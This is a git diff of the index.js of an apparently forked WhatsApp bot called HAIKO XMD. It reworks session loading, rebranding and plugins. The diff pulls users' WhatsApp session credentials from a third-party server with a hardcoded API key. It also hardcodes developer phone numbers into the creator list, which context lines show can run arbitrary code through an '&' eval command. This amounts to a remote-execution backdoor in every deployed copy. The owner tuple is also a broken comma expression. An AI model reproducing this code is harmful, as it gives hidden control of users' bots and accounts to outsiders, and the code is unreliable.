@@ -19,12 +19,13 @@ const {
     jidDecode,
     fetchLatestBaileysVersion,
     Browsers
-  } = require('@whiskeysockets/baileys')
+  } = require('baileys')
   
   
   const l = console.log
   const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
   const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data')
+  const { setupLinkDetection } = require("./lib/events/antilinkDetection")
   const fs = require('fs')
   const ff = require('fluent-ffmpeg')
   const P = require('pino')
@@ -34,18 +35,22 @@ const {
   const StickersTypes = require('wa-sticker-formatter')
   const util = require('util')
   const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
+  const { registerAntiNewsletter } = require('./plugins/antinewsletter')
+  const { updateActivity } = require('./lib/activity')
+  const { registerGroupMessages } = require('./plugins/groupMessages')
   const FileType = require('file-type');
+  const { File } = require('megajs');
   const axios = require('axios')
-  const { File } = require('megajs')
   const { fromBuffer } = require('file-type')
   const bodyparser = require('body-parser')
   const os = require('os')
   const Crypto = require('crypto')
   const path = require('path')
   const prefix = config.PREFIX
+  const https = require('https');
   
   const ownerNumber = ['529633982655']
-  
+  //=============================================
   const tempDir = path.join(os.tmpdir(), 'cache-temp')
   if (!fs.existsSync(tempDir)) {
       fs.mkdirSync(tempDir)
@@ -61,62 +66,164 @@ const {
           }
       });
   }
-  
+//=============================================
   // Clear the temp directory every 5 minutes
   setInterval(clearTempDir, 5 * 60 * 1000);
-  
-  //===================SESSION-AUTH============================
-if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
-if(!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env !!')
-const sessdata = config.SESSION_ID.replace("HAIKO~XMD~", '');
-const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
-filer.download((err, data) => {
-if(err) throw err
-fs.writeFile(__dirname + '/sessions/creds.json', data, () => {
-console.log("Session downloaded ✅")
-})})}
-// deploy from new repo this repo is cloes
+
+//=============================================
 
 const express = require("express");
 const app = express();
-const port = process.env.PORT || 9090;
+const port = process.env.PORT || 7860;
   
-  //=============================================
-  
-  async function connectToWA() {
-  console.log("Connecting to WhatsApp ⏳️...");
-  const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/')
-  var { version } = await fetchLatestBaileysVersion()
-  
-  const conn = makeWASocket({
-          logger: P({ level: 'silent' }),
-          printQRInTerminal: false,
-          browser: Browsers.macOS("Firefox"),
-          syncFullHistory: true,
-          auth: state,
-          version
-          })
+  //===================SESSION-AUTH============================
+const sessionDir = path.join(__dirname, 'sessions');
+const credsPath = path.join(sessionDir, 'creds.json');
+
+// Create session directory if it doesn't exist
+if (!fs.existsSync(sessionDir)) {
+    fs.mkdirSync(sessionDir, { recursive: true });
+}
+
+const SESSIONS_BASE_URL = 'https://pair-md-db.onrender.com'; // Your Backend URL
+const SESSIONS_API_KEY = 'xylo-ai'; // Your API Key
+
+async function loadSession() {
+    try {
+        if (!config.SESSION_ID) {
+            console.log('No SESSION_ID provided - QR login will be generated');
+            return null;
+        }
+
       
-  conn.ev.on('connection.update', (update) => {
-  const { connection, lastDisconnect } = update
-  if (connection === 'close') {
-  if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
-  connectToWA()
-  }
-  } else if (connection === 'open') {
-  console.log('🧬 Installing Plugins')
-  const path = require('path');
-  fs.readdirSync("./plugins/").forEach((plugin) => {
-  if (path.extname(plugin).toLowerCase() == ".js") {
-  require("./plugins/" + plugin);
-  }
-  });
-  console.log('Plugins installed successful ✅')
-  console.log('Bot connected to whatsapp ✅')
-  
-  let up = `╭──⧼⧼ 🤖 𝗛𝗔𝗜𝗞𝗢 𝗠𝗗𝗫 𝗩𝟮 ⧽⧽
+        console.log('Downloading creds data...');
+
+        // If SESSION_ID starts with "HAIKO~MDX~" - use Mongo download
+        if (config.SESSION_ID.startsWith('HAIKO~MDX~')) {
+            console.log('Downloading Mongo session...');
+            const response = await axios.get(`${SESSIONS_BASE_URL}/api/downloadCreds.php/${config.SESSION_ID}`, {
+                headers: { 'x-api-key': SESSIONS_API_KEY }
+            });
+
+            if (!response.data.credsData) {
+                throw new Error('No credential data received from Mongo server');
+            }
+
+            fs.writeFileSync(credsPath, JSON.stringify(response.data.credsData), 'utf8');
+            console.log('[✅] Mongo session downloaded successfully');
+            return response.data.credsData;
+        } 
+        // Otherwise try MEGA.nz download
+        else {
+            console.log('Downloading MEGA.nz sezsion...');
+// Remove "HAIKO~MDX~" prefix if present, otherwise use full SESSION_ID
+const megaFileId = config.SESSION_ID.startsWith('HAIKO~MDX~') 
+    ? config.SESSION_ID.replace("HAIKO~MDX~", "") 
+    : config.SESSION_ID;
+
+const filer = File.fromURL(`https://mega.nz/file/${megaFileId}`);
+            
+            const data = await new Promise((resolve, reject) => {
+                filer.download((err, data) => {
+                    if (err) reject(err);
+                    else resolve(data);
+                });
+            });
+            
+            fs.writeFileSync(credsPath, data);
+            console.log('[✅] MEGA session downloaded successfully');
+            return JSON.parse(data.toString());
+        }
+    } catch (error) {
+        console.error('❌ Error loading session:', error.message);
+        console.log('Will generate QR code instead');
+        return null;
+    }
+}
+
+//=========SESSION-AUTH=====================
+
+
+
+
+
+async function connectToWA() {
+    console.log("Haiko-xmd Connecting to WhatsApp ⏳️...");
+    
+    // Load session if available (now handles both Koyeb and MEGA)
+    const creds = await loadSession();
+    
+    const { state, saveCreds } = await useMultiFileAuthState(path.join(__dirname, 'sessions'), {
+        creds: creds || undefined // Pass loaded creds if available
+    });
+    
+    const { version } = await fetchLatestBaileysVersion();
+    
+    const conn = makeWASocket({
+        logger: P({ level: 'silent' }),
+        printQRInTerminal: !creds, // Only show QR if no session loaded
+        browser: Browsers.macOS("Firefox"),
+        syncFullHistory: true,
+        auth: state,
+        version,
+        getMessage: async () => ({})
+    });
+    
+    // ... rest of your existing connectToWA code ...
+
+	
+    conn.ev.on('connection.update', async (update) => {
+        const { connection, lastDisconnect, qr } = update;
+        
+        if (connection === 'close') {
+            if (lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut) {
+                console.log('Connection lost, reconnecting...');
+                setTimeout(connectToWA, 5000);
+            } else {
+                console.log('Connection closed, please change session ID');
+            }
+        } else if (connection === 'open') {
+            console.log('HAIKO XMD connected to WhatsApp ✅');
+            
+            
+            // Load plugins
+            const pluginPath = path.join(__dirname, 'plugins');
+            fs.readdirSync(pluginPath).forEach((plugin) => {
+                if (path.extname(plugin).toLowerCase() === ".js") {
+                    require(path.join(pluginPath, plugin));
+                }
+            });
+            console.log('Plugins installed successfully ✅');
+
+            
+                // Send connection message
+     	
+                try {
+		// const username = config.REPO.split('/').slice(3, 4)[0];
+             const username = `Mek-d1`;
+             const mekd1 = `https://github.com/${username}`;
+		
+                    const upMessage = `\`Xbot md Connected!\` ✅
+\n\n────────────────
+> 🌟 \`Star Repo\` : 
+"github.com/Mek-d1/HAIKO-XMD\n
+>  \`Follow Us\` :
+${mekd1}\n
+>   \`Bot Prefix\` ${prefix}
+────────────────
+\n> © ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴘʀɪɴᴄᴇ xᴛʀᴇᴍᴇ`;
+                    
+                    await conn.sendMessage(conn.user.id, { 
+                        image: { url: `https://files.catbox.moe/2rgdc4.jpg` },
+			ai: true,
+                        caption: upMessage
+			
+                    });
+		
+   // Send settings menu after connection message
+                    const cmdList = `╭──⧼⧼ 🤖 𝗛𝗔𝗜𝗞𝗢 𝗠𝗗𝗫 𝗩𝟮 ⧽⧽
 ├─▸ *ᴜʟᴛʀᴀ sᴜᴘᴇʀ ғᴀsᴛ ᴘᴏᴡᴇʀғᴜʟʟ ⚠️*  
-│     *ᴡᴏʀʟᴅ ʙᴇsᴛ ʙᴏᴛ ʜᴀɪᴋᴏ xᴍᴅ* 
+│     *ʙᴇsᴛ ʙᴏᴛ ʜᴀɪᴋᴏ xᴍᴅ* 
 ╰─➤ *ʏᴏᴜʀ sᴍᴀʀᴛ ᴡʜᴀᴛsᴀᴘᴘ ʙᴏᴛ ɪs ʀᴇᴀᴅʏ ᴛᴏ ᴜsᴇ 🍁!*  *ᴀᴅᴅ ᴄᴏᴍᴍᴇɴᴛᴍᴏʀᴇ ᴀᴄᴛɪᴏɴs*
 
 - *🖤 ᴛʜᴀɴᴋ ʏᴏᴜ ғᴏʀ ᴄʜᴏᴏsɪɴɢ ʜᴀɪᴋᴏ xᴍᴅ!* 
@@ -126,13 +233,33 @@ const port = process.env.PORT || 9090;
 ├─ 📢 *ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ:*  
 │      https://whatsapp.com/channel/0029Vb9qyTY47XeJ7i0wcQ40
 ├─ 🌟 *sᴛᴀʀ ᴛʜᴇ ʀᴇᴘᴏ:*
-│    https://github.com/JawadYT36/KHAN-MD  
+│    https://github.com/PrinceXtremeX/HAIKO-XMD  
 ╰─🚀 *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴘʀɪɴᴄᴇ xᴛʀᴇᴍᴇ*`;
-    conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/7zfdcq.jpg` }, caption: up })
-  }
-  })
-  conn.ev.on('creds.update', saveCreds)
-  //==============================
+
+                    await conn.sendMessage(conn.user.id, {
+                        image: { url: 'https://files.catbox.moe/2rgdc4.jpg' },
+                        ai: true,
+			caption: cmdList
+			 
+                    });
+                    
+                } catch (sendError) {
+                    console.error('Error sending messages:', sendError);
+                }
+            }
+
+        if (qr) {
+            console.log('Scan the QR code to connect or use session ID');
+        }
+    });
+
+    conn.ev.on('creds.update', saveCreds);
+
+    
+
+
+// =====================================
+	 
   conn.ev.on('messages.update', async updates => {
     for (const update of updates) {
       if (update.update.message === null) {
@@ -141,11 +268,16 @@ const port = process.env.PORT || 9090;
       }
     }
   });
-  //============================== 
-  conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update));	  
-	  
-  //=============readstatus=======
-        
+//=========WELCOME & GOODBYE =======
+	
+registerGroupMessages(conn);
+
+setupLinkDetection(conn);
+
+registerAntiNewsletter(conn);
+
+
+ /// READ STATUS       
   conn.ev.on('messages.upsert', async(mek) => {
     mek = mek.messages[0]
     if (!mek.message) return
@@ -164,7 +296,7 @@ const port = process.env.PORT || 9090;
     }
   if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true"){
     const jawadlike = await conn.decodeJid(conn.user.id);
-    const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
+    const emojis = ['❤️', '🌹', '😇', '❄️', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🇳🇬', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '✨', '🇳🇬', '💜', '💙', '🌝', '🖤', '💚'];
     const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
     await conn.sendMessage(mek.key.remoteJid, {
       react: {
@@ -209,17 +341,23 @@ const port = process.env.PORT || 9090;
   const isAdmins = isGroup ? groupAdmins.includes(sender) : false
   const isReact = m.message.reactionMessage ? true : false
   const reply = (teks) => {
-  conn.sendMessage(from, { text: teks }, { quoted: mek })
-  }
+ conn.sendMessage(from, { text: teks }, { quoted: mek })
+ }
+  
+  
   const udp = botNumber.split('@')[0];
-    const jawadop = ('529633982655', '522219610140', '50940140696');
+    const davex = ('529633982655', '522219610140');
     
-    const ownerFilev2 = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8'));  
-    
-    let isCreator = [udp, ...jawadop, config.DEV + '@s.whatsapp.net', ...ownerFilev2]
-    .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net') 
+    if (isGroup) {
+                updateActivity(from, sender);
+	  }
+	  // اینجا یک آرایه قرار می‌دهیم
+  const ownerFilev2 = JSON.parse(fs.readFileSync('./lib/owner.json', 'utf-8'));  
+  let isCreator = [udp, ...davex, config.DEV + '@s.whatsapp.net', ...ownerFilev2]
+    .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net') // اطمینان حاصل کنید که شماره‌ها به فرمت صحیح تبدیل شده‌اند
     .includes(mek.sender);
 	  
+
 	  if (isCreator && mek.text.startsWith("&")) {
             let code = budy.slice(2);
             if (!code) {
@@ -247,11 +385,25 @@ const port = process.env.PORT || 9090;
                 reply(util.format(err));
             }
             return;
-	  }	  
+        }
+
+   //=========BAN SUDO=============
+	// --- Ban and Sudo Utility Code for index.js ---
+ 
+ //=============DEV REACT==============
+    
+  if(senderNumber.includes("529633982655")){
+  if(isReact) return
+  m.react("🔥")
+   }
+/*if (senderNumber.includes(config.DEV)) {
+  ireturn m.react("🫟");
+}
+	  
+*/	  
   //==========public react============//
-  
-// Auto React for all messages (public and owner)
-if (!isReact && config.AUTO_REACT === 'true') {
+  // Auto React 
+  if (!isReact && config.AUTO_REACT === 'true') {
     const reactions = [
         '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', 
         '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', 
@@ -267,40 +419,50 @@ if (!isReact && config.AUTO_REACT === 'true') {
         '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', 
         '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', 
         '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', 
-        '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰'
+        '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇦🇫'
     ];
+
     const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
     m.react(randomReaction);
 }
           
 // custum react settings        
                         
-// Custom React for all messages (public and owner)
-if (!isReact && config.CUSTOM_REACT === 'true') {
-    // Use custom emojis from the configuration (fallback to default if not set)
-    const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
-    const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
-    m.react(randomReaction);
+if (!isReact && senderNumber !== botNumber) {
+    if (config.CUSTOM_REACT === 'true') {
+        // Use custom emojis from the configuration
+        const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,😐,🙂,😔').split(',');
+        const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
+        m.react(randomReaction);
+    }
 }
+
+if (!isReact && senderNumber === botNumber) {
+    if (config.HEART_REACT === 'true') {
+        // Use custom emojis from the configuration
+        const reactions = (config.CUSTOM_REACT_EMOJIS || '❤️,🧡,💛,💚,💚').split(',');
+        const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
+        m.react(randomReaction);
+    }
+} 
         
-  //==========Sudo and Mode ============ 
-	  
-// ban users 
-const bannedUsers = JSON.parse(fs.readFileSync('./lib/ban.json', 'utf-8'));
+    const bannedUsers = JSON.parse(fs.readFileSync('./lib/ban.json', 'utf-8'));
 const isBanned = bannedUsers.includes(sender);
+
 if (isBanned) return; // Ignore banned users completely
 	  
-  const ownerFile = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8'));  // JawadTechX 
+  const ownerFile = JSON.parse(fs.readFileSync('./lib/owner.json', 'utf-8'));  // خواندن فایل
   const ownerNumberFormatted = `${config.OWNER_NUMBER}@s.whatsapp.net`;
-  // json file setup
+  // بررسی اینکه آیا فرستنده در owner.json موجود است
   const isFileOwner = ownerFile.includes(sender);
   const isRealOwner = sender === ownerNumberFormatted || isMe || isFileOwner;
-  // mode settings 
+  // اعمال شرایط بر اساس وضعیت مالک
   if (!isRealOwner && config.MODE === "private") return;
   if (!isRealOwner && isGroup && config.MODE === "inbox") return;
   if (!isRealOwner && !isGroup && config.MODE === "groups") return;
+ 
 	  
-  // take commands 
+	  // take commands 
                  
   const events = require('./command')
   const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
@@ -677,13 +839,18 @@ if (isBanned) return; // Ignore banned users completely
     //=====================================================
     conn.getName = (jid, withoutContact = false) => {
             id = conn.decodeJid(jid);
+
             withoutContact = conn.withoutContact || withoutContact;
+
             let v;
+
             if (id.endsWith('@g.us'))
                 return new Promise(async resolve => {
                     v = store.contacts[id] || {};
+
                     if (!(v.name.notify || v.subject))
                         v = conn.groupMetadata(id) || {};
+
                     resolve(
                         v.name ||
                             v.subject ||
@@ -697,11 +864,13 @@ if (isBanned) return; // Ignore banned users completely
                     id === '0@s.whatsapp.net'
                         ? {
                                 id,
+
                                 name: 'WhatsApp',
                           }
                         : id === conn.decodeJid(conn.user.id)
                         ? conn.user
                         : store.contacts[id] || {};
+
             return (
                 (withoutContact ? '' : v.name) ||
                 v.subject ||
@@ -711,6 +880,7 @@ if (isBanned) return; // Ignore banned users completely
                 ).getNumber('international')
             );
         };
+
         // Vcard Functionality
         conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
             let list = [];
@@ -725,7 +895,7 @@ if (isBanned) return; // Ignore banned users completely
                         global.email
                     }\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${
                         global.github
-                    }/khan-xmd\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${
+                    }/xbot-md\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${
                         global.location
                     };;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
                 });
@@ -742,6 +912,7 @@ if (isBanned) return; // Ignore banned users completely
                 { quoted },
             );
         };
+
         // Status aka brio
         conn.setStatus = status => {
             conn.query({
@@ -763,12 +934,117 @@ if (isBanned) return; // Ignore banned users completely
         };
     conn.serializeM = mek => sms(conn, mek, store);
   }
+ app.get("/", (req, res) => {
+    res.send(`
+      <!DOCTYPE html>
+      <html lang="en">
+      <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>HAIKO XMD | STATUS</title>
+        <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono&display=swap" rel="stylesheet">
+        <style>
+          * {
+            box-sizing: border-box;
+          }
   
-  app.get("/", (req, res) => {
-  res.send("HAIKO XMD STARTED ✅");
-  });
+          body {
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Roboto Mono', monospace;
+            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+            color: #ffffff;
+          }
+  
+          .card {
+            background: rgba(0, 0, 0, 0.6);
+            padding: 30px 25px;
+            border-radius: 16px;
+            text-align: center;
+            box-shadow: 0 8px 24px rgba(0, 255, 128, 0.3);
+            border: 1px solid #00ff99;
+            width: 90%;
+            max-width: 420px;
+            animation: fadeInUp 1.2s ease-out;
+          }
+  
+          .card h1 {
+            font-size: 1.8rem;
+            color: #00ff99;
+            margin-bottom: 10px;
+          }
+  
+          .card p {
+            font-size: 1rem;
+            color: #cccccc;
+          }
+
+          .status-dot {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            background-color: #00ff99;
+            border-radius: 50%;
+            margin-right: 8px;
+            vertical-align: middle;
+            animation: pulse 1.2s infinite;
+          }
+  
+          @keyframes fadeInUp {
+            from {
+              opacity: 0;
+              transform: translateY(30px);
+            }
+            to {
+              opacity: 1;
+              transform: translateY(0);
+            }
+          }
+  
+          @keyframes pulse {
+            0% {
+              transform: scale(1);
+              opacity: 1;
+            }
+            50% {
+              transform: scale(1.3);
+              opacity: 0.6;
+            }
+            100% {
+              transform: scale(1);
+              opacity: 1;
+            }
+          }
+  
+          @media (max-width: 480px) {
+            .card {
+              padding: 20px 15px;
+            }
+  
+            .card h1 {
+              font-size: 1.4rem;
+            }
+  
+            .card p {
+              font-size: 0.95rem;
+            }
+          }
+        </style>
+      </head>
+      <body>
+        <div class="card">
+          <h1><span class="status-dot"></span> HAIKO XMD IS RUNNING</h1>
+          <p>PrinceXtremeX IS MY OFC OWNER.</p>
+        </div>
+      </body>
+      </html>
+    `);
+});
   app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
   setTimeout(() => {
   connectToWA()
   }, 4000);
-// Powered By PrinceXtremeX HAIKO-XMD 2025
